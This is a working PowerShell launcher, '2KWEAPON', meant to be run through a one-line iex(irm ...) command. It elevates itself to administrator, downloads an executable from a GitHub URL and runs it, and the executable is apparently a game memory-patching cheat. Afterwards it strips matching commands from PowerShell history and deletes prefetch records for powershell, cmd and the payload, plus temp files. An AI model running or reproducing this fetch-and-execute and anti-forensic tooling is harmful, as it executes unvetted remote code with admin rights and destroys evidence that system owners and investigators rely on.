# 2KWEAPON launcher - works with:
#   powershell -File .\2KWEAPON.ps1
#   iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/2KWEAPON.ps1')

param(
    [string]$ExeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.exe',
    [string]$ScriptUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/2KWEAPON.ps1'
)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$script:MarkerDir = Join-Path $env:LOCALAPPDATA '2KWEAPON'
$script:MarkerFile = Join-Path $script:MarkerDir '.launcher_paths'

function Register-CleanupPath {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return }
    try {
        if (-not (Test-Path $script:MarkerDir)) {
            New-Item -ItemType Directory -Path $script:MarkerDir -Force | Out-Null
        }
        Add-Content -Path $script:MarkerFile -Value $Path -Encoding UTF8
    } catch {}
}

function Invoke-LauncherCleanup {
    param([string[]]$ExtraPaths = @())

    foreach ($p in $ExtraPaths) {
        Register-CleanupPath $p
    }

    if ($PSCommandPath -and ($PSCommandPath.StartsWith($env:TEMP, [System.StringComparison]::OrdinalIgnoreCase))) {
        Register-CleanupPath $PSCommandPath
    }

    $paths = @()
    if (Test-Path $script:MarkerFile) {
        try { $paths = Get-Content $script:MarkerFile -ErrorAction SilentlyContinue } catch {}
    }

    foreach ($p in $paths) {
        if ([string]::IsNullOrWhiteSpace($p)) { continue }
        try {
            if (Test-Path $p) { Remove-Item $p -Force -ErrorAction SilentlyContinue }
        } catch {}
    }

    $tempRoots = @($env:TEMP)
    $localTemp = Join-Path $env:LOCALAPPDATA 'Temp'
    if (Test-Path $localTemp) { $tempRoots += $localTemp }

    foreach ($root in $tempRoots) {
        foreach ($glob in @('w2k_*.ps1', '2KWEAPON_run.ps1', 'run.ps1', '2kweapon.tmp', 'g.ps1', 'ps-script-*.ps1')) {
            Get-ChildItem -Path $root -Filter $glob -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
        }
        Get-ChildItem -Path $root -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '2KWEAPON|2kweapon|w2k_|Libery32|libery32' } |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }

    try {
        if (Test-Path $script:MarkerFile) { Remove-Item $script:MarkerFile -Force -ErrorAction SilentlyContinue }
    } catch {}

    $self = $PSCommandPath
    if ($self -and (Test-Path $self) -and ($self.StartsWith($env:TEMP, [System.StringComparison]::OrdinalIgnoreCase))) {
        try {
            Start-Process cmd.exe -WindowStyle Hidden -ArgumentList @(
                '/c', ('timeout /t 2 /nobreak >nul & del /f /q "' + $self + '"')
            ) | Out-Null
        } catch {}
    }
}

function Clear-LauncherHistory {
    param([string]$ExtraPattern = '')

    $historyPattern = 'discord|cmd|libery32|Libery32|2kweapon|2KWEAPON|w2k_|2k-weaponsrc|2K-WEAPON|irm|iex|Invoke-WebRequest|Invoke-RestMethod|WebClient|DownloadFile|OutFile|UseBasicParsing|raw\.githubusercontent|lubyralph6-maker|ExecutionPolicy|powershell.*bypass|Start-Process.*powershell|Remove-Item|del /f|timeout /t|launcher_paths|Invoke-LauncherCleanup|wpn_scan|wpn_patch|wpn_float|original_aob|patch_value|keyauth|ค่าเดิม|ค่าแพท|(?i)^Scan\s+[0-9A-Fa-f]{2}|\.ps1|\.exe'
    if ($ExtraPattern) { $historyPattern += '|' + $ExtraPattern }

    $historyPaths = @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
        (Join-Path $env:APPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
    )

    foreach ($historyPath in $historyPaths) {
        if (-not (Test-Path $historyPath)) { continue }
        try {
            $keep = Get-Content $historyPath -ErrorAction SilentlyContinue |
                Where-Object { $_ -and ($_ -notmatch $historyPattern) }
            if ($null -eq $keep) { $keep = @() }
            $keep | Set-Content -Path $historyPath -Encoding UTF8
        } catch {}
    }

    try { Clear-History -ErrorAction SilentlyContinue } catch {}
}

function Clear-LauncherPrefetch {
    param([string]$RandomName = '')

    try {
        if ($RandomName) {
            Remove-Item ('C:\Windows\Prefetch\*' + $RandomName + '*') -Force -ErrorAction SilentlyContinue
        }
        Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
        Remove-Item 'C:\Windows\Prefetch\POWERSHELL.EXE*.pf' -Force -ErrorAction SilentlyContinue
        Remove-Item 'C:\Windows\Prefetch\PWSH.EXE*.pf' -Force -ErrorAction SilentlyContinue
        Remove-Item 'C:\Windows\Prefetch\CMD.EXE*.pf' -Force -ErrorAction SilentlyContinue
        Remove-Item 'C:\Windows\Prefetch\CONHOST.EXE*.pf' -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Start-ElevatedSelf {
    $tmp = Join-Path $env:TEMP ('w2k_' + [guid]::NewGuid().ToString('N') + '.ps1')
    Register-CleanupPath $tmp
    (New-Object Net.WebClient).DownloadFile($ScriptUrl, $tmp)
    Start-Process powershell.exe -Verb RunAs -ArgumentList @('-nop', '-ep', 'bypass', '-NoExit', '-File', $tmp)
}

function Remove-TempExe {
    param([string]$ExePath)

    if ([string]::IsNullOrWhiteSpace($ExePath)) { return }
    if (-not (Test-Path -LiteralPath $ExePath)) { return }

    $inTemp = $ExePath.StartsWith($env:TEMP, [System.StringComparison]::OrdinalIgnoreCase)
    $localTemp = Join-Path $env:LOCALAPPDATA 'Temp'
    if (-not $inTemp -and (Test-Path $localTemp)) {
        $inTemp = $ExePath.StartsWith($localTemp, [System.StringComparison]::OrdinalIgnoreCase)
    }
    if (-not $inTemp) { return }

    for ($i = 1; $i -le 8; $i++) {
        try {
            if (Test-Path -LiteralPath $ExePath) {
                Remove-Item -LiteralPath $ExePath -Force -ErrorAction Stop
                Write-Host 'Deleted' -ForegroundColor Green
                return
            }
        } catch {
            Start-Sleep -Seconds 2
        }
    }

    if (Test-Path -LiteralPath $ExePath) {
        try {
            Start-Process cmd.exe -WindowStyle Hidden -ArgumentList @(
                '/c', ('timeout /t 3 /nobreak >nul & del /f /q "' + $ExePath + '"')
            ) | Out-Null
        } catch {}
    }
}

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $admin) {
    Write-Host 'Requesting Administrator...' -ForegroundColor Cyan
    Start-ElevatedSelf
    exit
}

try { Remove-Module PSReadLine -ErrorAction SilentlyContinue } catch {}

$randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
$targetExe = $null
$deleteAfterRun = $false

if ($PSScriptRoot) {
    $localExe = Join-Path $PSScriptRoot 'Libery32.exe'
    if (Test-Path -LiteralPath $localExe) {
        $targetExe = $localExe
        Write-Host ('Using local: ' + $localExe) -ForegroundColor Green
    }
}

if (-not $targetExe) {
    $targetExe = Join-Path $env:TEMP ($randomName + '.exe')
    Register-CleanupPath $targetExe
    $deleteAfterRun = $true

    $downloaded = $false
    foreach ($url in @($ExeUrl, 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe')) {
        if ([string]::IsNullOrWhiteSpace($url)) { continue }
        try {
            Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
            (New-Object Net.WebClient).DownloadFile($url, $targetExe)
            if ((Test-Path $targetExe) -and ((Get-Item $targetExe).Length -gt 100000)) {
                $downloaded = $true
                break
            }
            Remove-Item $targetExe -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Host ('Failed: ' + $url) -ForegroundColor Yellow
            Remove-Item $targetExe -Force -ErrorAction SilentlyContinue
        }
    }

    if (-not $downloaded) {
        Write-Host 'Download failed. Upload Libery32.exe to GitHub first.' -ForegroundColor Red
        Clear-LauncherHistory -ExtraPattern $randomName
        Clear-LauncherPrefetch -RandomName $randomName
        Invoke-LauncherCleanup
        Read-Host 'Press Enter to close'
        exit 1
    }

    Write-Host 'Downloaded' -ForegroundColor Green
}

Write-Host 'Starting 2KWEAPON...' -ForegroundColor Cyan
$proc = Start-Process -FilePath $targetExe -PassThru
if ($null -eq $proc) {
    Write-Host 'Start-Process failed.' -ForegroundColor Red
    exit 1
}

$proc.WaitForExit()
Start-Sleep -Seconds 2

if ($deleteAfterRun) {
    Remove-TempExe -ExePath $targetExe
}

Clear-LauncherHistory -ExtraPattern $randomName
Clear-LauncherPrefetch -RandomName $randomName
Invoke-LauncherCleanup

Write-Host 'Finished' -ForegroundColor Green
Read-Host 'Press Enter to close'
